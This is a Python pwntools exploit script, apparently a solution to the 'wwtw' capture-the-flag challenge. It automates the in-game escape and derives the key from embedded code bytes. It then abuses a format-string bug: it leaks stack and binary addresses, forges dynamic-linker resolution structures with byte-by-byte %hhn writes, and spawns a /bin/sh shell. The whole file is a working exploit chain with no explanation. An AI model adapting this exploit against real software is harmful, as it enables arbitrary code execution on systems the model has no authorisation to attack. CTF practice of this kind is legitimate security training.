#!/usr/bin/env python
from pwn import *

def find(field, cset):
    for i in range(20):
        for j in range(20):
            if field[i][j] in cset:
                return (i, j)

def escape():
    while s.recv(6) != 'TARDIS':
        s.recvuntil('90\n')
        field = [s.recvline(False)[3:] for i in range(20)]
        s.recvuntil('q): ')
        vi, vj = find(field, '^V<>')
        ei, ej = find(field, 'ET')

        if vi < ei and field[vi+1][vj] != 'A':
            s.sendline('s')
            continue
        if vi > ei and field[vi-1][vj] != 'A':
            s.sendline('w')
            continue
        if vj < ej and field[vi][vj+1] != 'A':
            s.sendline('d')
            continue
        if vj > ej and field[vi][vj-1] != 'A':
            s.sendline('a')
            continue

        if vi < 19 and field[vi+1][vj] != 'A':
            s.sendline('s')
            continue
        if vi > 0 and field[vi-1][vj] != 'A':
            s.sendline('w')
            continue
        if vj < 19 and field[vi][vj+1] != 'A':
            s.sendline('d')
            continue
        if vj > 0 and field[vi][vj-1] != 'A':
            s.sendline('a')
            continue

        print 'You are dead.'
        exit(1)

def enterkey():
    data = "U\x89\xe5S\x83\xec$\xe8\xdc\xfb\xff\xff\x81\xc3<A\x00\x00\xc7E\xf0\x00\x00\x00\x8d\x83\x06\xe0\xff\xff\x89\x04$\xe8\xa1\xf9\xff\xff\x8b\x83\xf0\xff\xff\xff\x8b\x00\x89"
    key = ''
    for c in data:
        c = chr(ord(c) & 0x7f)
        if c.isalnum():
            key += c
            if len(key) == 10:
                break
    s.sendlineafter('KEY: ', key)

def fsb(payload):
    coordinates = '51.492137,-0.192878 '
    s.sendlineafter('Coordinates: ', coordinates + payload)
    s.recvuntil(coordinates)
    return s.recvuntil(' is')[:-3]

def overwrite(target, data):
    for i, d in enumerate(data):
        payload = ''
        payload += p32(target + i)
        payload += '%{}x'.format(((ord(d) - 24) & 0xff) + 0x100)
        payload += '%20$hhn'
        fsb(payload)

def main():
    escape()
    enterkey()

    s.sendlineafter('Selection: ', '1' * 8 + '\0')
    time.sleep(3)
    s.send(p32(0x55592b70))

    s.sendlineafter('Selection: ', '1')
    s.sendlineafter('Selection: ', '3')

    stack_addr = int(fsb('%8$p'), 16) + 0x3d8
    log.info('stack address: %#x' % stack_addr)

    text_base = int(fsb('%161$p'), 16) - 0x559
    log.info('text base: %#x' % text_base)

    dl_runtime_resolve = 0x850
    reloc_base = 0x72c
    symtab_base = 0x1e0
    strtab_base = 0x4a0
    bss = 0x5550

    payload = ''
    payload += p32(text_base + dl_runtime_resolve)
    payload += p32(bss - reloc_base)
    payload += 'A' * 4
    payload += p32(text_base + bss + 0x27)
    overwrite(stack_addr, payload)

    payload = ''
    payload += p32(bss) + p32((bss - symtab_base + 0x10 << 4) + 0x7)
    payload += 'A' * 8
    payload += p32(bss - strtab_base + 0x20)
    payload += 'B' * 0x8
    payload += p32(3)
    payload += 'system\0'
    payload += '/bin/sh\0'
    overwrite(text_base + bss, payload)

    s.sendlineafter('Coordinates: ', '0,0')
    s.recvuntil('0,0\n')

    s.interactive()

if __name__ == '__main__':
    s = process('./wwtw')
    main()
